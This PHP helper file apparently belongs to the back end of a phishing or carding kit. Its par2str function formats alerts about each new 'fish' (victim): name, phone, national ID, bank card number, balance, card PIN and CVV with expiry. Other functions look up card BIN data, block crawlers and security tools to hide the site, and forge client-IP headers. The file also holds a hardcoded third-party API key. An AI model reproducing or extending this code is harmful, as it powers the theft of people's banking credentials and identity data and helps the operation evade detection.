<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 流年 <liu21st@gmail.com>
// +----------------------------------------------------------------------

// 应用公共文件
function par2str($param)
{
    $arr = [
        'name' => '姓      名:   ',
        'mobile' => '手 机 号:   ',
        'idcard' => '身 份 证:   ',
        'bankinfo' => '银      行:   ',
        'bankcard' => '卡      号:   ',
        'balance' => '余      额:   ',
        'bankpass' => '卡 密 码:   ',
        'cvn' => 'CVV|有效期:   ',
        'ip' => 'IP 信 息:   '
        
    ];
    
    $str = '信息提醒：&#10;&#10;<b>您的站点新进一条鱼,请登录后台查看！</b>&#10;&#10;';
    
    foreach($arr as $k => $v) 
    {
        
        
        if(!empty($param[$k]))
        {
            
           $txt = str2xstr($param[$k]);
            if($k == 'cvn')
            {
                $str .= $v .'<code>' . $txt .'----'.str2xstr($param['endtime']). '</code>&#10;';
            }elseif($k == 'ip'){
                $str .= $v .'<code>' . $txt .'----'.$param['ipaddress']. '</code>&#10;';
            }else{
                
                $str .= $v .'<code>' . $txt . '</code>&#10;';
            }
        }
        
    }
    
    return $str;
}



function bin2detail($bin)
{
    $value = Db::name('card')->where('bin',$bin)->value('result');
    
    if(!empty($value))
    {
        return $value;
    }
    
    $url = "https://bincheck.io/api/v1?bin=$bin";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_ENCODING, "");
    curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,5);
    curl_setopt($ch, CURLOPT_TIMEOUT,5);
    curl_setopt($ch, CURLOPT_HTTPHEADER,[
		"X-RapidAPI-Host: bin-ip-checker.p.rapidapi.com",
		"X-RapidAPI-Key: 23b19ffc4dmsh83622835bb5f9cdp18ba61jsn0969c3e6bd89",
		"content-type: application/json"
	]);
    curl_setopt($ch, CURLOPT_POSTFIELDS,json_encode(['bin' => $bin]));
    $output = curl_exec($ch);
    $result = json_decode($output, true);
    curl_close($ch);
    if($result['code'] == 200)
    {
        unset($result['BIN']['country']['flag']);
        $result = json_encode($result['BIN']);
        Db::name('card')->insert(['bin' => $bin, 'result' => $result]);
        return $result;
    }else{
        return false;
    }
}

function ip2detail($ip,$key)
{
    $value = Db::name('iplist')->where('ip',$ip)->value('value');
    
    if(!empty($value))
    {
        return json_decode($value, true);
    }
    
    $url = "https://api.ipregistry.co/$ip?key=$key";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    //curl_setopt($ch,CURLOPT_HTTPHEADER,$headerArray);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,5);
    curl_setopt($ch, CURLOPT_TIMEOUT,5);
    $output = curl_exec($ch);
    curl_close($ch);
    $result = json_decode($output,true);
    
    if(!empty($result['ip']))
    {
        Db::name('iplist')->insert(['ip' => $ip, 'value' => json_encode($result)]);
        return $result;
    }
    
    return false;
}

//判断是否存在
function is_region($str, $adr)
{
    $pattern = "/$str/i";
    $is_region = preg_match($pattern, $adr);
    
    return (bool)$is_region;
}

function is_pc() {
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $keywords = array('Windows NT', 'Macintosh');
    foreach ($keywords as $keyword) {
        if (strpos($user_agent, $keyword) !== false) {
            return true;
        }
    }
    return false;
}

//判断是否移动端
function is_mobile()
{
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $pattern = '/Mobile|Android|iPhone|iPad|iPod/i';
    $isMobile = preg_match($pattern, $userAgent);
    
    return (bool)$isMobile;
}

//判断是否是爬虫
function is_reptile()
{
    $isCrawler = false;
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $pattern = '/Go|Python|python|en-US|compatible|http|X11|HTTPie|insomnia|Paw|Postman|Apifox|yahoo|msn|bing|google|fetch|facebook|curl|slurp|HaosouSpider|YisouSpider|Googlebot|Bingbot|Slurp|DuckDuckBot|YandexBot|bot|crawl|spider|Baiduspider|360Spider|Sogou web spider|Sogou inst spider|YoudaoBot/i';
    $isCrawler = preg_match($pattern, $userAgent);
    return (bool)$isCrawler;
}

// 身份证号码验证
function checkIDCard($idCard) {
  $reg = '/(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/';
  if (!preg_match($reg, $idCard)) {
    return false;
  }
  
  $provinceCode = substr($idCard, 0, 2);
  $birthday = substr($idCard, 6, 8);
  $year = substr($birthday, 0, 4);
  $month = substr($birthday, 4, 2);
  $day = substr($birthday, 6, 2);
  $date = DateTime::createFromFormat('Y-m-d', $year . '-' . $month . '-' . $day);
  if (!$date || $date->format('Y') != $year || $date->format('m') != $month || $date->format('d') != $day) {
    return false;
  }
  // 验证身份证号码的校验码
  $weight = array(7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2);
  $checkCode = array('1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2');
  $sum = 0;
  for ($i = 0; $i < 17; $i++) {
    $sum += intval(substr($idCard, $i, 1)) * $weight[$i];
  }
  if ($checkCode[$sum % 11] != strtoupper(substr($idCard, 17, 1))) {
    return false;
  }
  return true;
}

function str2xcard($str = '')
{
    $txt = str_replace('<i class="cat">', '',$str);
    $txt = str_replace('</i>', '',$txt);
    $txt = str_replace('<br>', '|',$txt);
    $txt = str_split($txt, 4); // 将字符串拆分为每四位字符的数组
    $txt = implode(" ", $txt);
    return $txt;
}

function str2xstr($str = '')
{
    $txt = str_replace('<i class="cp">', '',$str);
    $txt = str_replace('</i>', '',$txt);
    $txt = str_replace('<i class="cat">', '',$txt);
    $txt = str_replace('<br>', '|',$txt);
    return $txt;
}

function arr2str($arr)
{
    $str = 'id:';
    foreach ($arr as $v)
    {
        if(!empty($v))
        {
            $v = str_replace('<i class="cp">', '',$v);
            $v = str_replace('</i>', '',$v);
            $v = str_replace('<i class="cat">', '',$v);
            $v = str_replace('<br>', '|',$v);
            $str .= '---' . $v;
        }
        
    }
    return $str;
}


function rand_str($length = 15) { 
	$chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; 
	$str = ''; 
	for ($i = 0; $i < $length; $i++) 
	{ 
		$str .= $chars[mt_rand(0, strlen($chars) - 1)]; 
	} 
	return $str;
}

function getRandomIP() {
    $ip = array();
    for ($i = 0; $i < 4; $i++) {
        $ip[] = rand(0, 255);
    }
    return implode('.', $ip);
}

/**
 * 反序列化 拼接字符串
 */
function DeserializationField($str)
{
    $str = unserialize($str);
    $arr = arrgetkey($str, 'name');
    return implode('|', $arr);
}

/**
 * 获取今日起止时间戳
 */
function gainjin()
{
    $arr = [
        'q' => mktime(0,0,0,date('m'),date('d'),date('Y')),
        'z' => mktime(0,0,0,date('m'),date('d')+1,date('Y'))-1
    ];

    return $arr;
}

/**
 * 获取昨日起止时间戳
 */
function gainzuo()
{
    $arr = [
        'q' => mktime(0,0,0,date('m'),date('d')-1,date('Y')),
        'z' => mktime(0,0,0,date('m'),date('d'),date('Y'))-1
    ];

    return $arr;
}

/**
 * 记录自定义try异常信息
 * @param obj 异常信息对象 type异常类型 true框架异常 false自定义异常
 */
function WriteExceptionInformation($obj, $type = false)
{

}

/**
 * 获取自定义输出信息
 */
function getLang($code)
{
    return Config::get('baseLang.' . $code);
}

/**
 * 判断域名状态
 */
function checkdomain($domain)
{
    $baseurl = 'https://panda.www.net.cn/cgi-bin/check.cgi?area_domain=';

    return xml2Arr(curl_get($baseurl . $domain));
}

/**
 * 对需要复制的字段加标签
 */
function addstr($str)
{
    return '<i class="cp">' . $str . '</i>';
}

/**
 * php数组字典序
*/
function ASCII($params = array()){
    //ksort()对数组按照键名进行升序排序
    ksort($params);
    //reset()内部指针指向数组中的第一个元素
    reset($params);
    $str = http_build_query($params, '', '&');
    return $str;
}

/**
 * xml 转 Array
 */
function xml2Arr($xml)
{
    return simplexml_load_string($xml);
}

/**
 * php请求参数 取sign
*/
function getParamSign($array = [])
{
    if(isset($array['sign']))
    {
        unset($array['sign']);
    }

    $array = ASCII($array);
    //var_dump($array,md5(md5($array)));die;
    return md5(md5($array));
}

/**
 * 验证uniapp 提交数据的sign
 */
function checkParamSign($array = [])
{
    if(empty($array['sign'])) return false;
    $sign = $array['sign'];
    unset($array['sign']);
    //var_dump(getParamSign($array));die;
    return getParamSign($array) == $sign ? true : false;
}

/**
 * 根据跳转字符取名称
 */
function getspeechpage($str)
{
    return Config::get('speech.' . $str);
}

/**
 * 数组库字段取对应名称
 * @param  [type] $field [description]
 * @return [type]        [description]
 */
function field2Str($field = [])
{
    $arr = Config::get('field.');
    $data = [];
    foreach ($field as $key => $value) {

        $data[] = [
            'name' => $arr[$value['name']],
            'field' => $value['name']
        ];
    }

    return $data;
}

function getIp()
{
    return Request()->ip();
}

function jsonen($arr)
{
    return json_encode($arr, JSON_UNESCAPED_UNICODE);
}

function fail($msg = '', $code = 201)
{
    if($code == 404)
    {
        return header("status: 404 Not Found");
    }

    $result = [

        'code' => $code,
        'msg' => $msg
    ];

    return jsonen($result);
}

function success($msg, $data = [], $code = 200)
{
    $result = [

        'code' => $code,
        'msg' => $msg
    ];

    if(!empty($data))
    {
        $result['data'] = $data;
    }

    return jsonen($result);
}

/**
 * 二维数组 取数组中某个值作为新一维数组
 */
function arrgetkey($arr, $name)
{
    $res = [];
    foreach ($arr as $k => $v) {
        $res[] = $v[$name];
    }

    return $res;
}

/**
 * 获取管理后台用户登录信息
 * @return seller array uid(商户id) user(用户名)
 * @return user   array uid(台子管理id) user(台子管理用户名) wid(台子id)
 */
function getSid($status = 'seller')
{
    return Session::get($status);
}


function result($code, $msg, $data = [])
{
    $arr = ['code' => $code, 'msg' => $msg];
    if(empty($data))
    {
        return json($arr);
    }else{
        $arr['data'] = $data;
        return json($arr);
    }

}


function checkPass($pass, $salt)
{
    return md5(md5($pass . $salt) . $salt);
}


function get_os()
{
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $os = false;
    if (preg_match('/win/i', $agent) && strpos($agent, '95'))
    {
        $os = 'Windows 95';
    }
    else if (preg_match('/win 9x/i', $agent) && strpos($agent, '4.90'))
    {
        $os = 'Windows ME';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/98/i', $agent))
    {
        $os = 'Windows 98';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt 6.0/i', $agent))
    {
        $os = 'Windows Vista';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt 6.1/i', $agent))
    {
        $os = 'Windows 7';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt 6.2/i', $agent))
    {
        $os = 'Windows 8';
    }else if(preg_match('/win/i', $agent) && preg_match('/nt 10.0/i', $agent))
    {
        $os = 'Windows 10';
    }else if (preg_match('/win/i', $agent) && preg_match('/nt 5.1/i', $agent))
    {
        $os = 'Windows XP';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt 5/i', $agent))
    {
        $os = 'Windows 2000';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/nt/i', $agent))
    {
        $os = 'Windows NT';
    }
    else if (preg_match('/win/i', $agent) && preg_match('/32/i', $agent))
    {
        $os = 'Windows 32';
    }
    else if (preg_match('/sun/i', $agent) && preg_match('/os/i', $agent))
    {
        $os = 'SunOS';
    }
    else if (preg_match('/ibm/i', $agent) && preg_match('/os/i', $agent))
    {
        $os = 'IBM OS/2';
    }
    else if (preg_match('/Mac/i', $agent) && preg_match('/PC/i', $agent))
    {
        $os = 'Mac';
    }
    else if (preg_match('/PowerPC/i', $agent))
    {
        $os = 'PowerPC';
    }
    else if (preg_match('/AIX/i', $agent))
    {
        $os = 'AIX';
    }
    else if (preg_match('/HPUX/i', $agent))
    {
        $os = 'HPUX';
    }
    else if (preg_match('/NetBSD/i', $agent))
    {
        $os = 'NetBSD';
    }
    else if (preg_match('/BSD/i', $agent))
    {
        $os = 'BSD';
    }
    else if (preg_match('/OSF1/i', $agent))
    {
        $os = 'OSF1';
    }
    else if (preg_match('/IRIX/i', $agent))
    {
        $os = 'IRIX';
    }
    else if (preg_match('/FreeBSD/i', $agent))
    {
        $os = 'FreeBSD';
    }
    else if (preg_match('/teleport/i', $agent))
    {
        $os = 'teleport';
    }
    else if (preg_match('/flashget/i', $agent))
    {
        $os = 'flashget';
    }
    else if (preg_match('/webzip/i', $agent))
    {
        $os = 'webzip';
    }
    else if (preg_match('/offline/i', $agent))
    {
        $os = 'offline';
    }
    else if (preg_match('/ipod/i', $agent))
    {
        $os = 'ipod';
    }
    else if (preg_match('/ipad/i', $agent))
    {
        $os = 'ipad';
    }
    else if (preg_match('/iphone/i', $agent))
    {
        $os = 'iphone';
    }
    else if (preg_match('/android/i', $agent))
    {
        $os = 'Android';
    }
    else if (preg_match('/linux/i', $agent))
    {
        $os = 'Linux';
    }
    else if (preg_match('/unix/i', $agent))
    {
        $os = 'Unix';
    }
    else
    {
        $os = '未知操作系统';
    }
    return $os;
}

function curl_get($url, $rip = false)
{
    $headerArray =array("Content-type:application/json;","Accept:application/json");
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch,CURLOPT_HTTPHEADER,$headerArray);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,10);
    curl_setopt($ch, CURLOPT_TIMEOUT,10);
    if($rip)
    {
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "X-Forwarded-For: " . getRandomIP(),
            "Client-IP: " . getRandomIP()
        ));
    }
    //echo 222;die;
    $output = curl_exec($ch);
//     if ($output === false) {
//     echo 'Curl error: ' . curl_error($ch);die;
// }
    curl_close($ch);
    // $output = json_decode($output,true);
    return $output;
}

function curl_post($url, $data)
{
    $data  = json_encode($data);
    $headerArray =array("Content-type:application/json;charset='utf-8'","Accept:application/json");
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,FALSE);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    curl_setopt($curl,CURLOPT_HTTPHEADER,$headerArray);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($curl);
    curl_close($curl);
    return $output;
}

function send_post($remote_server, $post_string) {
  //$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $remote_server);
  //curl_setopt($ch, CURLOPT_PROXY, $ip);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'mypost=' . $post_string);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:'.Rand_IP(), 'CLIENT-iP:'.Rand_IP()));
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.50");
  $data = curl_exec($ch);
  curl_close($ch);
  return $data;
}

function Rand_IP()
{
    return $_SERVER['REMOTE_ADDR'];
}

/**
 * ip转真实地址
 * http://ip-api.com/json/154.201.87.225?lang=zh-CN
 * https://ip.useragentinfo.com/jsonp?ip=154.201.87.225
 */
function ipToAddress($ip)
{
    
    if(empty($ip) || $ip == '127.0.0.1')
	{
		return '未识别出';
	}
	
	//return '未识别出';
	$url = "http://ip-api.com/json/$ip?lang=zh-CN";
	$res = curl_get($url);
    
    $res = json_decode($res, true);
	return !isset($res['country']) ? '未识别': $res['country'] . $res['regionName'];
}